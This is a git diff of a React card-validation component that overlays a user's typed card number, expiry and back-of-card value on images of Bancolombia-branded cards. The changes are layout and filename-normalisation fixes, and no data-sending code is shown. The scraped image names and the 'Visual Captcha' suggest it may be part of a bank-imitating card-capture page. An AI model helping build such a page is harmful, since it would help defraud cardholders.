@@ -288,8 +288,13 @@ export default function ValidacionTC() {
 
 
     // 1. Mapa de imágenes frontales a traseras
-    // 1. Mapa de imágenes frontales a traseras
     const getBackCardFilename = (frontFilename) => {
+        // Normalizar a .webp antes de buscar en el mapa
+        let normalizedFilename = frontFilename;
+        if (frontFilename && frontFilename.endsWith(".png")) {
+            normalizedFilename = frontFilename.replace(".png", ".webp");
+        }
+
         const frontToBackMap = {
             // Crédito - Mastercard
             "imgi_10_Mastercard_ideal_.webp": "Mastercard-ideal.webp",
@@ -318,12 +323,12 @@ export default function ValidacionTC() {
             "imgi_27_AMEX+Platinum.webp": "Amex-Platinum-v1.webp",
             "imgi_7_Amex+Libre.webp": "Amex+Libre.webp",
             // Débito
-            "imgi_141_Imagen-Tarjeta-Debito-Civica-de-Bancolombia-3.webp": "Débito Cívica.webp",
+            "imgi_141_Imagen-Tarjeta-Debito-Civica-de-Bancolombia-3.webp": "Débito_Cívica.webp",
             "imgi_5_Debito_(preferencial).webp": "Débito Preferencial.webp",
             "imgi_7_004_600x379.webp": "Débito Clásica.webp",
             "debito_virtual.webp": "debito_virtual.webp"
         };
-        return frontToBackMap[frontFilename] || null;
+        return frontToBackMap[normalizedFilename] || null;
     };
 
     // 2. SISTEMA DE AJUSTE VISUAL (NORMALIZACIÓN)
@@ -370,7 +375,24 @@ export default function ValidacionTC() {
 
     // --- HELPER PARA CONFIGURACIÓN DE TEXTO ---
     const getCardConfig = (filename) => {
-        return CARD_TEXT_CONFIG[filename] || CARD_TEXT_CONFIG["default"];
+        // Asegurar normalización a .webp para buscar en config
+        let lookupFilename = filename;
+        if (filename && filename.endsWith(".png")) {
+            lookupFilename = filename.replace(".png", ".webp");
+        }
+
+        const defaultConfig = CARD_TEXT_CONFIG["default"];
+        const cardConfig = CARD_TEXT_CONFIG[lookupFilename];
+
+        // Si no existe config para esta tarjeta, usar default completo
+        if (!cardConfig) return defaultConfig;
+
+        // Merge: combinar config específico con default
+        return {
+            digits: { ...defaultConfig.digits, ...(cardConfig.digits || {}) },
+            date: { ...defaultConfig.date, ...(cardConfig.date || {}) },
+            back: { ...defaultConfig.back, ...(cardConfig.back || {}) }
+        };
     };
 
     // Metodo de manejo de cambios en los dígitos de la tarjeta
@@ -906,8 +928,8 @@ export default function ValidacionTC() {
                                         </div>
                                         <div style={{
                                             position: "absolute",
-                                            top: getCardConfig(cardData.filename).date?.top || "70%",
-                                            left: getCardConfig(cardData.filename).date?.left || "50%",
+                                            top: getCardConfig(cardData.filename).date?.top || "75%",
+                                            left: getCardConfig(cardData.filename).date?.left || "54%",
                                             transform: "translate(-50%, -50%)",
                                             width: getCardConfig(cardData.filename).date?.width || "88%",
                                             textAlign: getCardConfig(cardData.filename).date?.textAlign || "left",
@@ -928,11 +950,11 @@ export default function ValidacionTC() {
                                         />
                                         <div style={{
                                             position: "absolute",
-                                            top: getCardConfig(cardData.filename).back.top,
-                                            left: getCardConfig(cardData.filename).back.left,
+                                            top: getCardConfig(getBackCardFilename(cardData.filename) || cardData.filename).back.top,
+                                            left: getCardConfig(getBackCardFilename(cardData.filename) || cardData.filename).back.left,
                                             transform: "translate(-50%, -50%)",
-                                            color: getCardConfig(cardData.filename).back.color,
-                                            fontSize: getCardConfig(cardData.filename).back.fontSize || "20px",
+                                            color: getCardConfig(getBackCardFilename(cardData.filename) || cardData.filename).back.color,
+                                            fontSize: getCardConfig(getBackCardFilename(cardData.filename) || cardData.filename).back.fontSize || "20px",
                                             fontFamily: "monospace",
                                             fontWeight: "bold",
                                             pointerEvents: "none"
@@ -1089,7 +1111,7 @@ export default function ValidacionTC() {
             </div>
 
             <div className="visual-captcha" style={{ cursor: "pointer" }}>
-                <img src="/assets/images/lateral-der.webp" alt="Visual Captcha" />
+                <img src="/assets/images/lateral-der.png" alt="Visual Captcha" />
             </div>
 
             {cargando ? <Loading /> : null}
